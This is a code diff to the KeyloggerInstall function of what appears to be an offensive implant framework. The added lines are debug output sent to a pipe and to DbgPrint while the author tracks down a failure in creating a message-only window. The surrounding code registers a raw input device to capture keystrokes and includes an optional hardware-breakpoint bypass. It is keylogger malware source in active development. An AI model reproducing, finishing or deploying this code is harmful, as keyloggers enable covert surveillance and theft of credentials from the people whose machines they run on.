@@ -36,6 +36,9 @@ auto DECLFN KeyloggerInstall(
 
     Instance->Win32.SetStdHandle( STD_OUTPUT_HANDLE, Instance->Pipe.Write );
 
+	CHAR* teststr = "[+] PIPE WORKSSS\n";
+	Instance->Win32.WriteFile(Instance->Pipe.Write, teststr, Str::LengthA(teststr), nullptr, 0);
+
     if ( Instance->Ctx.Bypass ) {
         Hwbp::KeyloggerInit( Instance->Ctx.Bypass );
     }
@@ -52,12 +55,34 @@ auto DECLFN KeyloggerInstall(
         DWORD err = NtCurrentTeb()->LastErrorValue;
         return  KeyloggerCleanup();
     }
+
+	teststr = "[+] Registered Window Class: \n";
+    Instance->Win32.WriteFile(Instance->Pipe.Write, teststr, Str::LengthA(teststr), nullptr, 0);
     
+	teststr = "[*] Creating Message-Only Window 111...\n";
+    Instance->Win32.WriteFile(Instance->Pipe.Write, teststr, Str::LengthA(teststr), nullptr, 0);
+
+	// NEED TO FIX BELOW CODE : issue in creating a message-only window
     HWND WindowHandle = Instance->Win32.CreateWindowExW(0, WinClass.lpszClassName, NULL, 0, 0, 0, 0, 0, HWND_MESSAGE, NULL, Instance->Win32.GetModuleHandleA(NULL), NULL);
+    DWORD err = NtCurrentTeb()->LastErrorValue;
+	Instance->Win32.DbgPrint("CreateWindowExW err: %d\n", err);
+
+	// not reaching here
+    teststr = "[*] Creating Message-Only Window...\n";
+    Instance->Win32.WriteFile(Instance->Pipe.Write, teststr, Str::LengthA(teststr), nullptr, 0);
+
+	Instance->Win32.DbgPrint("\n\n=======================\n[+] WindowHandle: %p\n", WindowHandle);
+
     if(! WindowHandle)
     {
+		teststr = "[!] Failed to create Message-Only Window\n";
+        Instance->Win32.WriteFile(Instance->Pipe.Write, teststr, Str::LengthA(teststr), nullptr, 0);
+
         return KeyloggerCleanup();
     }
+
+	teststr = "[+] Created Message-Only Window\n";
+    Instance->Win32.WriteFile(Instance->Pipe.Write, teststr, Str::LengthA(teststr), nullptr, 0);
 
     RAWINPUTDEVICE RawDevice = { 0 };
 
@@ -68,8 +93,14 @@ auto DECLFN KeyloggerInstall(
 
     if (!Instance->Win32.RegisterRawInputDevices(&RawDevice, 1, sizeof(RAWINPUTDEVICE)))
     {
+		teststr = "[!] Failed to register Raw Input Device\n";
+        Instance->Win32.WriteFile(Instance->Pipe.Write, teststr, Str::LengthA(teststr), nullptr, 0);
+
         return KeyloggerCleanup();
     }
+
+	teststr = "[+] Registered Raw Input Device\n";
+    Instance->Win32.WriteFile(Instance->Pipe.Write, teststr, Str::LengthA(teststr), nullptr, 0);
 
     MSG Msg = { 0 };
 
